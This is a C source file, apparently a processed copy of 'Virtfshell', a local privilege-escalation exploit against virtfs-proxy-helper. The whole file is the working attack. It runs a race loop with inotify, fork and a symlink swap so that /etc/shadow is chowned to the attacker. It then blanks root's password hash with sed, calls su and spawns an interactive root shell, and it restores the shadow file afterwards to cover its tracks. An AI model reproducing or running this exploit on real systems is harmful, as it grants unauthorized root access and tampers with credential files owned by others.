
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int pid_t ;


 int IN_CREATE ;
 int SIGKILL ;
 int _exit (int) ;
 int close (int) ;
 int execlp (char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,int *) ;
 int fork () ;
 int getgid () ;
 int getuid () ;
 int inotify_add_watch (int,char*,int ) ;
 int inotify_init () ;
 int it_worked () ;
 int kill (int,int ) ;
 int mkdir (char*,int) ;
 int printf (char*,...) ;
 int read (int,int ,int ) ;
 int sprintf (char*,char*,int) ;
 int symlink (char*,char*) ;
 int system (char*) ;
 int unlink (char*) ;
 int wait (int *) ;

int main(int argc, char **argv)
{
 int fd;
 pid_t pid;
 char uid[12], gid[12];
 size_t attempts = 0;

 sprintf(uid, "%d", getuid());
 sprintf(gid, "%d", getgid());

 printf("== Virtfshell - by zx2c4 ==\n");

 printf("[+] Beginning race loop\n");

 while (!it_worked()) {
  printf("\033[1A\033[2K[+] Trying to win race, attempt %zu\n", ++attempts);
  fd = inotify_init();
  unlink("/tmp/virtfshell/sock");
  mkdir("/tmp/virtfshell", 0777);
  inotify_add_watch(fd, "/tmp/virtfshell", IN_CREATE);
  pid = fork();
  if (pid == -1)
   continue;
  if (!pid) {
   close(0);
   close(1);
   close(2);
   execlp("virtfs-proxy-helper", "virtfs-proxy-helper", "-n", "-p", "/tmp", "-u", uid, "-g", gid, "-s", "/tmp/virtfshell/sock", ((void*)0));
   _exit(1);
  }
  read(fd, 0, 0);
  unlink("/tmp/virtfshell/sock");
  symlink("/etc/shadow", "/tmp/virtfshell/sock");
  close(fd);
  kill(pid, SIGKILL);
  wait(((void*)0));
 }

 printf("[+] Chown'd /etc/shadow, elevating to root\n");

 system( "cp /etc/shadow /tmp/original_shadow;"
  "sed 's/^root:.*/root::::::::/' /etc/shadow > /tmp/modified_shadow;"
  "cat /tmp/modified_shadow > /etc/shadow;"
  "su -c '"
  "	echo [+] Cleaning up;"
  "	cat /tmp/original_shadow > /etc/shadow;"
  "	chown root:root /etc/shadow;"
  "	rm /tmp/modified_shadow /tmp/original_shadow;"
  "	echo [+] Spawning root shell;"
  "	exec /bin/bash -i"
  "'");
 return 0;
}
